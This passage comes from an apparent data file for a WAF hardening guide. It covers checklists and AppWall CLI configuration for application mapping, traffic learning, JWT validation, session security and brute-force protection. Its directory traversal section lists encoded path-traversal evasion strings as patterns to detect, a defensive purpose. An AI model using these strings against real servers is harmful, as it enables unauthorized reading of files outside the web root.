                { id: '2.5.7', text: 'Map API swagger/OpenAPI specifications', priority: 'high' },
                { id: '2.5.8', text: 'Configure CORS policy for API endpoints', priority: 'high' },
                { id: '2.5.9', text: 'Define GraphQL query depth and complexity limits', priority: 'high' },
                { id: '2.5.10', text: 'Implement API gateway integration', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Effective Application Mapping',
            content: `
                <p class="mb-4 text-gray-700">Accurate application mapping is crucial for ensuring the WAF understands legitimate application behavior.</p>
                
                <h5 class="font-semibold mb-2 text-gray-800">Service Definition</h5>
                <p class="mb-4 text-gray-700">Define all application services, entry points, and backend servers to ensure proper protection coverage.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Define web application services</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">service</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Main-Web-Portal"</span></div>
                    <div><span class="code-command">service</span> <span class="code-value">"Main-Web-Portal"</span></div>
                    <div><span class="code-param">virtual-ip</span> <span class="code-value">203.0.113.50</span></div>
                    <div><span class="code-param">virtual-port</span> <span class="code-value">443</span></div>
                    <div><span class="code-param">ssl-enabled</span> <span class="code-value">yes</span></div>
                    <div><span class="code-param">protocol</span> <span class="code-value">https</span></div>
                    <div><span class="code-param">hostname</span> <span class="code-value">www.example.com</span></div>
                    <div class="code-comment"># Define backend server pool</div>
                    <div><span class="code-command">server-pool</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"web-servers"</span></div>
                    <div><span class="code-command">server-pool</span> <span class="code-value">"web-servers"</span></div>
                    <div><span class="code-command">server</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.0.0.101</span> <span class="code-param">port</span> <span class="code-value">443</span></div>
                    <div><span class="code-command">server</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.0.0.102</span> <span class="code-param">port</span> <span class="code-value">443</span></div>
                    <div><span class="code-param">health-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">health-check interval</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">health-check timeout</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">health-check path</span> <span class="code-value">"/health.html"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">service</span> <span class="code-value">"Main-Web-Portal"</span></div>
                    <div><span class="code-param">server-pool</span> <span class="code-value">"web-servers"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Multi-Service Environment Configuration</h5>
                <p class="mb-4 text-gray-700">Configure multiple related services with proper grouping for centralized management.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Create application group with multiple services</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">app-group</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"CorporatePortal"</span> <span class="code-param">description</span> <span class="code-value">"Corporate web applications"</span></div>
                    <div><span class="code-command">app-group</span> <span class="code-value">"CorporatePortal"</span></div>
                    <div><span class="code-command">service</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Main-Web-Portal"</span></div>
                    <div><span class="code-command">service</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"API-Gateway"</span> <span class="code-param">virtual-ip</span> <span class="code-value">203.0.113.51</span> <span class="code-param">virtual-port</span> <span class="code-value">443</span> <span class="code-param">protocol</span> <span class="code-value">https</span> <span class="code-param">hostname</span> <span class="code-value">"api.example.com"</span></div>
                    <div><span class="code-command">service</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Admin-Portal"</span> <span class="code-param">virtual-ip</span> <span class="code-value">203.0.113.52</span> <span class="code-param">virtual-port</span> <span class="code-value">443</span> <span class="code-param">protocol</span> <span class="code-value">https</span> <span class="code-param">hostname</span> <span class="code-value">"admin.example.com"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Traffic Learning Configuration',
            content: `
                <p class="mb-4 text-gray-700">Implementing effective traffic learning enables the WAF to build a profile of legitimate application behavior.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure traffic learning</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">learning</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">duration</span> <span class="code-value">14</span></div>
                    <div><span class="code-param">confidence-level</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">minimum-hits</span> <span class="code-value">50</span></div>
                    <div><span class="code-param">maximum-modifications</span> <span class="code-value">1000</span></div>
                    <div><span class="code-param">auto-apply-learned-rules</span> <span class="code-value">disable</span></div>
                    <div><span class="code-param">learn-from-trusted-sources-only</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">trusted-source</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">192.168.10.0/24</span></div>
                    <div><span class="code-command">trusted-source</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.50.0.0/16</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Learning Validation Process</h5>
                <p class="mb-4 text-gray-700">Regularly review and validate learned application behavior to prevent potential security bypasses.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Review and accept learned rules</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">learning</span></div>
                    <div><span class="code-command">suggested-rules</span> <span class="code-value">show</span></div>
                    <div><span class="code-command">suggested-rules</span> <span class="code-value">apply-all</span></div>
                    <div><span class="code-command">suggested-urls</span> <span class="code-value">show</span></div>
                    <div><span class="code-command">suggested-urls</span> <span class="code-value">apply id</span> <span class="code-param">12345</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Content Type and Parameter Profiling',
            content: `
                <p class="mb-4 text-gray-700">Properly defining content types and expected parameters helps prevent injection attacks and data exfiltration.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure URL and parameter profiles</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">content-profile</span></div>
                    <div class="code-comment"># Define URL pattern</div>
                    <div><span class="code-command">url</span> <span class="code-value">add</span> <span class="code-param">pattern</span> <span class="code-value">"/login.php"</span> <span class="code-param">methods</span> <span class="code-value">"GET,POST"</span></div>
                    <div><span class="code-command">url</span> <span class="code-value">"/login.php"</span></div>
                    <div class="code-comment"># Define parameters for URL</div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"username"</span> <span class="code-param">type</span> <span class="code-value">"alpha-numeric"</span> <span class="code-param">max-length</span> <span class="code-value">32</span> <span class="code-param">required</span> <span class="code-value">yes</span></div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"password"</span> <span class="code-param">type</span> <span class="code-value">"any"</span> <span class="code-param">max-length</span> <span class="code-value">64</span> <span class="code-param">required</span> <span class="code-value">yes</span></div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"remember_me"</span> <span class="code-param">type</span> <span class="code-value">"boolean"</span> <span class="code-param">required</span> <span class="code-value">no</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Define file upload URL with restrictions</div>
                    <div><span class="code-command">url</span> <span class="code-value">add</span> <span class="code-param">pattern</span> <span class="code-value">"/upload.php"</span> <span class="code-param">methods</span> <span class="code-value">"POST"</span></div>
                    <div><span class="code-command">url</span> <span class="code-value">"/upload.php"</span></div>
                    <div><span class="code-command">file-upload</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">file-upload</span> <span class="code-param">max-size</span> <span class="code-value">10240</span></div>
                    <div><span class="code-command">file-upload</span> <span class="code-param">allowed-types</span> <span class="code-value">add</span> <span class="code-param">type</span> <span class="code-value">"image/jpeg"</span></div>
                    <div><span class="code-command">file-upload</span> <span class="code-param">allowed-types</span> <span class="code-value">add</span> <span class="code-param">type</span> <span class="code-value">"image/png"</span></div>
                    <div><span class="code-command">file-upload</span> <span class="code-param">allowed-types</span> <span class="code-value">add</span> <span class="code-param">type</span> <span class="code-value">"application/pdf"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">JSON/XML Payload Configuration</h5>
                <p class="mb-4 text-gray-700">Configure structured data validation for API endpoints to prevent injection attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure JSON payload validation</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">content-profile</span></div>
                    <div><span class="code-command">url</span> <span class="code-value">add</span> <span class="code-param">pattern</span> <span class="code-value">"/api/users"</span> <span class="code-param">methods</span> <span class="code-value">"POST,PUT"</span></div>
                    <div><span class="code-command">url</span> <span class="code-value">"/api/users"</span></div>
                    <div><span class="code-param">content-type</span> <span class="code-value">"application/json"</span></div>
                    <div><span class="code-command">json-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">json-schema</span> <span class="code-value">add</span> <span class="code-param">path</span> <span class="code-value">"/schemas/user-schema.json"</span></div>
                    <div><span class="code-param">max-json-depth</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">max-array-items</span> <span class="code-value">100</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'API and Authentication Mapping',
            content: `
                <p class="mb-4 text-gray-700">Properly mapping API endpoints and authentication flows helps prevent unauthorized access and API abuse.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure API endpoint protections</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">api-protection</span></div>
                    <div><span class="code-param">openapi-schema</span> <span class="code-value">import</span> <span class="code-param">file</span> <span class="code-value">"/schemas/api-swagger.json"</span></div>
                    <div><span class="code-param">strict-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">rate-limit</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">rate-limit</span> <span class="code-param">threshold</span> <span class="code-value">100</span> <span class="code-param">per</span> <span class="code-value">minute</span></div>
                    <div><span class="code-command">rate-limit</span> <span class="code-param">path</span> <span class="code-value">add</span> <span class="code-param">pattern</span> <span class="code-value">"/api/search"</span> <span class="code-param">threshold</span> <span class="code-value">20</span> <span class="code-param">per</span> <span class="code-value">minute</span></div>
                    <div><span class="code-command">api-auth</span></div>
                    <div><span class="code-param">jwt-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">jwt-key</span> <span class="code-value">set</span> <span class="code-param">method</span> <span class="code-value">"jwks"</span> <span class="code-param">url</span> <span class="code-value">"https://auth.example.com/.well-known/jwks.json"</span></div>
                    <div><span class="code-param">required-claims</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"iss"</span> <span class="code-param">value</span> <span class="code-value">"https://auth.example.com/"</span></div>
                    <div><span class="code-param">required-claims</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"aud"</span> <span class="code-param">value</span> <span class="code-value">"api.example.com"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Session Management Configuration</h5>
                <p class="mb-4 text-gray-700">Configure session tracking and security to prevent session-based attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure session management protections</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">session-management</span></div>
                    <div><span class="code-param">tracking-method</span> <span class="code-value">"cookie"</span></div>
                    <div><span class="code-param">cookie-name</span> <span class="code-value">"SESSIONID"</span></div>
                    <div><span class="code-param">max-sessions-per-ip</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">session-timeout</span> <span class="code-value">1800</span></div>
                    <div><span class="code-param">enforce-timeout</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">csrf-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">token-parameter-name</span> <span class="code-value">"csrf_token"</span></div>
                    <div><span class="code-param">token-header-name</span> <span class="code-value">"X-CSRF-Token"</span></div>
                    <div><span class="code-command">brute-force-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">login-url</span> <span class="code-value">"/login.php"</span></div>
                    <div><span class="code-param">login-failure-indicator</span> <span class="code-value">"Invalid username or password"</span></div>
                    <div><span class="code-param">max-attempts</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">block-period</span> <span class="code-value">300</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        }
    ],
    tools: [
        {
            title: 'Web Crawler',
            icon: 'fa-spider',
            description: 'Automated tools to map all available application URLs and endpoints for comprehensive WAF configuration.',
            link: 'https://www.zaproxy.org/',
            linkText: 'OWASP ZAP'
        },
        {
            title: 'Traffic Analyzer',
            icon: 'fa-chart-bar',
            description: 'Tools to analyze HTTP traffic patterns and identify common application behaviors and parameters.',
            link: 'https://www.wireshark.org/',
            linkText: 'Wireshark'
        },
        {
            title: 'AppWall Learning Console',
            icon: 'fa-graduation-cap',
            description: 'Radware\'s built-in learning system for analyzing and approving learned application behaviors.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Documentation'
        },
        {
            title: 'Postman',
            icon: 'fa-paper-plane',
            description: 'API testing platform for validating endpoint behaviors and payloads when configuring API protections.',
            link: 'https://www.postman.com/',
            linkText: 'Website'
        },
        {
            title: 'Swagger Inspector',
            icon: 'fa-file-code',
            description: 'Tool for validating OpenAPI/Swagger specifications and testing API behaviors against documented standards.',
            link: 'https://swagger.io/tools/swagger-inspector/',
            linkText: 'Website'
        },
        {
            title: 'Charles Proxy',
            icon: 'fa-exchange-alt',
            description: 'HTTP proxy tool for intercepting and analyzing application traffic during mapping and learning phases.',
            link: 'https://www.charlesproxy.com/',
            linkText: 'Website'
        },
        {
            title: 'ELK Stack',
            icon: 'fa-search',
            description: 'Log management platform for analyzing application traffic patterns and identifying behaviors for WAF learning.',
            link: 'https://www.elastic.co/what-is/elk-stack',
            linkText: 'Website'
        },
        {
            title: 'ModSecurity Audit Console',
            icon: 'fa-clipboard-list',
            description: 'Tool for reviewing and analyzing WAF events and traffic patterns for rule refinement.',
            link: 'https://github.com/SpiderLabs/ModSecurity',
            linkText: 'GitHub'
        },
        {
            title: 'sqlmap',
            icon: 'fa-database',
            description: 'Tool for testing SQL injection vulnerabilities and validating WAF parameter protections.',
            link: 'https://sqlmap.org/',
            linkText: 'Website'
        },
        {
            title: 'JWT Decoder',
            icon: 'fa-key',
            description: 'Tool for analyzing JWT token structures when configuring API authentication protections.',
            link: 'https://jwt.io/',
            linkText: 'Website'
        }
    ]
},
       {
    id: 'authentication',
    title: '3. Authentication & Authorization',
    subtitle: 'User access controls, session management, and login protection',
    icon: 'fa-key',
    priority: 'critical',
    progress: 0,
    checklist: [
        {
            title: '3.1 Authentication Protection',
            icon: 'fa-user-lock',
            items: [
                { id: '3.1.1', text: 'Identify and map all authentication endpoints', priority: 'critical' },
                { id: '3.1.2', text: 'Configure brute force protection for login pages', priority: 'critical' },
                { id: '3.1.3', text: 'Set up rate limiting for authentication attempts', priority: 'high' },
                { id: '3.1.4', text: 'Enable CAPTCHA or similar mechanisms for suspected attacks', priority: 'medium' },
                { id: '3.1.5', text: 'Implement account lockout protection', priority: 'high' },
                { id: '3.1.6', text: 'Configure geographic-based login restrictions if applicable', priority: 'medium' },
                { id: '3.1.7', text: 'Enable alerting for authentication anomalies', priority: 'high' },
                { id: '3.1.8', text: 'Implement multi-factor authentication (MFA) support', priority: 'critical' },
                { id: '3.1.9', text: 'Configure password complexity policy enforcement', priority: 'high' },
                { id: '3.1.10', text: 'Set up credential stuffing detection and prevention', priority: 'high' },
                { id: '3.1.11', text: 'Implement IP reputation-based access controls', priority: 'medium' },
                { id: '3.1.12', text: 'Configure authentication time anomaly detection', priority: 'medium' },
                { id: '3.1.13', text: 'Set up device fingerprinting for suspicious login detection', priority: 'medium' },
                { id: '3.1.14', text: 'Enable secure password reset functionality protection', priority: 'critical' }
            ]
        },
        {
            title: '3.2 Session Management',
            icon: 'fa-id-card',
            items: [
                { id: '3.2.1', text: 'Configure cookie security settings (HttpOnly, Secure flags)', priority: 'critical' },
                { id: '3.2.2', text: 'Set up session token validation', priority: 'critical' },
                { id: '3.2.3', text: 'Implement session hijacking protection', priority: 'critical' },
                { id: '3.2.4', text: 'Enable session fixation prevention', priority: 'high' },
                { id: '3.2.5', text: 'Configure session timeout enforcement', priority: 'medium' },
                { id: '3.2.6', text: 'Implement cookie encryption if required', priority: 'high' },
                { id: '3.2.7', text: 'Set up protection against cookie tampering', priority: 'high' },
                { id: '3.2.8', text: 'Configure SameSite cookie attribute enforcement', priority: 'high' },
                { id: '3.2.9', text: 'Implement session entropy validation', priority: 'critical' },
                { id: '3.2.10', text: 'Set up session concurrent login controls', priority: 'medium' },
                { id: '3.2.11', text: 'Configure session revocation mechanisms', priority: 'high' },
                { id: '3.2.12', text: 'Enable IP binding for critical sessions', priority: 'high' },
                { id: '3.2.13', text: 'Implement forced re-authentication for sensitive actions', priority: 'high' },
                { id: '3.2.14', text: 'Configure cross-domain session protections', priority: 'medium' }
            ]
        },
        {
            title: '3.3 Authorization Controls',
            icon: 'fa-user-shield',
            items: [
                { id: '3.3.1', text: 'Identify and map access-controlled resources', priority: 'critical' },
                { id: '3.3.2', text: 'Configure URL access control enforcement', priority: 'high' },
                { id: '3.3.3', text: 'Set up parameter tampering protection', priority: 'critical' },
                { id: '3.3.4', text: 'Implement forced browsing prevention', priority: 'high' },
                { id: '3.3.5', text: 'Enable protection against directory traversal', priority: 'critical' },
                { id: '3.3.6', text: 'Configure logical access control enforcement', priority: 'high' },
                { id: '3.3.7', text: 'Set up insecure direct object reference protection', priority: 'high' },
                { id: '3.3.8', text: 'Implement role-based access control (RBAC) validation', priority: 'critical' },
                { id: '3.3.9', text: 'Configure attribute-based access control (ABAC) if used', priority: 'high' },
                { id: '3.3.10', text: 'Set up privilege escalation detection', priority: 'critical' },
                { id: '3.3.11', text: 'Implement horizontal access control validation', priority: 'high' },
                { id: '3.3.12', text: 'Configure access control matrix enforcement', priority: 'high' },
                { id: '3.3.13', text: 'Set up least privilege validation for API endpoints', priority: 'critical' },
                { id: '3.3.14', text: 'Implement business logic authorization checks', priority: 'high' }
            ]
        },
        {
            title: '3.4 Token-Based Authentication',
            icon: 'fa-passport',
            items: [
                { id: '3.4.1', text: 'Implement JWT token validation', priority: 'critical' },
                { id: '3.4.2', text: 'Configure signature verification for tokens', priority: 'critical' },
                { id: '3.4.3', text: 'Set up token expiration checks', priority: 'high' },
                { id: '3.4.4', text: 'Enable audience validation for tokens', priority: 'high' },
                { id: '3.4.5', text: 'Implement token revocation mechanisms', priority: 'high' },
                { id: '3.4.6', text: 'Configure scope/permissions validation', priority: 'critical' },
                { id: '3.4.7', text: 'Set up protection against token replay attacks', priority: 'high' },
                { id: '3.4.8', text: 'Implement key rotation for token signing', priority: 'high' },
                { id: '3.4.9', text: 'Configure algorithm enforcement for token validation', priority: 'critical' },
                { id: '3.4.10', text: 'Set up claim validation rules', priority: 'high' }
            ]
        },
        {
            title: '3.5 Federated Authentication',
            icon: 'fa-users-cog',
            items: [
                { id: '3.5.1', text: 'Configure identity provider trust relationships', priority: 'critical' },
                { id: '3.5.2', text: 'Implement SAML assertion validation', priority: 'critical' },
                { id: '3.5.3', text: 'Set up OpenID Connect identity verification', priority: 'critical' },
                { id: '3.5.4', text: 'Configure signature validation for assertions', priority: 'critical' },
                { id: '3.5.5', text: 'Implement authorization server validation', priority: 'high' },
                { id: '3.5.6', text: 'Set up proper CORS configuration for federated auth', priority: 'high' },
                { id: '3.5.7', text: 'Configure SSO session management', priority: 'high' },
                { id: '3.5.8', text: 'Implement proper session mapping to identity claims', priority: 'high' },
                { id: '3.5.9', text: 'Set up secure identity provider redirection', priority: 'critical' },
                { id: '3.5.10', text: 'Configure proper protocol bindings for identity assertions', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Brute Force Protection Implementation',
            content: `
                <p class="mb-4 text-gray-700">Protect login endpoints from automated password guessing and credential stuffing attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure brute force protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">brute-force-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">login-url</span> <span class="code-value">"/login"</span></div>
                    <div><span class="code-param">username-parameter</span> <span class="code-value">"username"</span></div>
                    <div><span class="code-param">password-parameter</span> <span class="code-value">"password"</span></div>
                    <div><span class="code-param">max-attempts</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">detection-period</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">block-period</span> <span class="code-value">1800</span></div>
                    <div><span class="code-param">captcha-after-attempts</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">alert-threshold</span> <span class="code-value">10</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Brute Force Mitigation</h5>
                <p class="mb-4 text-gray-700">Implement multi-layered brute force protection with additional features:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced brute force protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">brute-force-protection</span></div>
                    <div class="code-comment"># Enable credential stuffing detection</div>
                    <div><span class="code-param">credential-stuffing-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">credential-stuffing-threshold</span> <span class="code-value">20</span></div>
                    <div class="code-comment"># Configure progressive delays</div>
                    <div><span class="code-param">progressive-delay</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">progressive-delay-increment</span> <span class="code-value">2000</span></div>
                    <div><span class="code-param">progressive-delay-max</span> <span class="code-value">10000</span></div>
                    <div class="code-comment"># Set up IP reputation checking</div>
                    <div><span class="code-param">ip-reputation-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ip-reputation-block-threshold</span> <span class="code-value">medium</span></div>
                    <div class="code-comment"># Configure device fingerprinting</div>
                    <div><span class="code-param">device-fingerprinting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">device-fingerprinting-attributes</span> <span class="code-value">"user-agent,accept-language,screen-resolution"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Session Security Configuration',
            content: `
                <p class="mb-4 text-gray-700">Strengthen session management to prevent session hijacking and related attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure session security</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">cookies</span></div>
                    <div><span class="code-command">cookie</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"SESSIONID"</span> <span class="code-param">type</span> <span class="code-value">"session-token"</span></div>
                    <div><span class="code-command">cookie</span> <span class="code-value">"SESSIONID"</span></div>
                    <div><span class="code-param">secure-flag</span> <span class="code-value">enforce</span></div>
                    <div><span class="code-param">httponly-flag</span> <span class="code-value">enforce</span></div>
                    <div><span class="code-param">samesite</span> <span class="code-value">lax</span></div>
                    <div><span class="code-param">sign</span> <span class="code-value">yes</span></div>
                    <div><span class="code-param">encrypt</span> <span class="code-value">no</span></div>
                    <div><span class="code-param">max-age</span> <span class="code-value">3600</span></div>
                    <div><span class="code-param">session-fixation-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Enhanced Session Management</h5>
                <p class="mb-4 text-gray-700">Implement advanced session security features for comprehensive protection:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced session security features</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">session-management</span></div>
                    <div class="code-comment"># Configure entropy validation</div>
                    <div><span class="code-param">session-token-entropy</span> <span class="code-value">validate</span></div>
                    <div><span class="code-param">minimum-entropy-bits</span> <span class="code-value">128</span></div>
                    <div class="code-comment"># Configure session binding</div>
                    <div><span class="code-param">session-binding</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">bind-to-ip</span> <span class="code-value">partial</span></div>
                    <div><span class="code-param">bind-to-user-agent</span> <span class="code-value">yes</span></div>
                    <div class="code-comment"># Configure concurrent session management</div>
                    <div><span class="code-param">concurrent-sessions</span> <span class="code-value">limit</span></div>
                    <div><span class="code-param">max-concurrent-sessions</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">concurrent-session-action</span> <span class="code-value">"terminate-oldest"</span></div>
                    <div class="code-comment"># Configure forced re-authentication</div>
                    <div><span class="code-command">reauthentication-urls</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/account/settings"</span></div>
                    <div><span class="code-command">reauthentication-urls</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/payment/process"</span></div>
                    <div><span class="code-param">reauthentication-idle-timeout</span> <span class="code-value">300</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Directory Traversal Protection',
            content: `
                <p class="mb-4 text-gray-700">Prevent attackers from accessing files outside the web root directory using path traversal techniques.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure directory traversal protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">url-protection</span></div>
                    <div><span class="code-param">directory-traversal-detection</span> <span class="code-value">strict</span></div>
                    <div><span class="code-param">path-normalization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">decode-url-multiple-times</span> <span class="code-value">yes</span></div>
                    <div><span class="code-param">max-url-depth</span> <span class="code-value">8</span></div>
                    <div class="code-comment"># Allow specific directories that might contain "../" legitimately</div>
                    <div><span class="code-command">directory-traversal-exception</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/code-examples/"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <p class="mb-4 mt-4 text-gray-700">Directory traversal protection must handle various evasion techniques including:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li>Double and triple encoding: <code>%252e%252e%252f</code> (triple-encoded "../")</li>
                    <li>Path normalization bypasses: <code>..././..././</code></li>
                    <li>Unicode/UTF-8 variants: <code>%c0%ae%c0%ae%c0%af</code></li>
                    <li>Backslash variations: <code>..\\..\\</code></li>
                    <li>Non-standard path separators: <code>..;/..;/</code></li>
                </ul>
            `
        },
        {
            title: 'JWT Token Security Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure comprehensive JWT token validation to prevent common token-based authentication vulnerabilities.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure JWT token security</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">jwt-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure signature validation</div>
                    <div><span class="code-param">signature-validation</span> <span class="code-value">required</span></div>
                    <div><span class="code-param">allowed-algorithms</span> <span class="code-value">"RS256,ES256"</span></div>
                    <div><span class="code-param">disallowed-algorithms</span> <span class="code-value">"none,HS256"</span></div>
                    <div class="code-comment"># Configure key management</div>
                    <div><span class="code-param">jwks-url</span> <span class="code-value">"https://auth.example.com/.well-known/jwks.json"</span></div>
                    <div><span class="code-param">jwks-refresh-interval</span> <span class="code-value">3600</span></div>
                    <div class="code-comment"># Configure claim validation</div>
                    <div><span class="code-command">claim-validation</span> <span class="code-value">add</span> <span class="code-param">claim</span> <span class="code-value">"exp"</span> <span class="code-param">type</span> <span class="code-value">"required"</span></div>
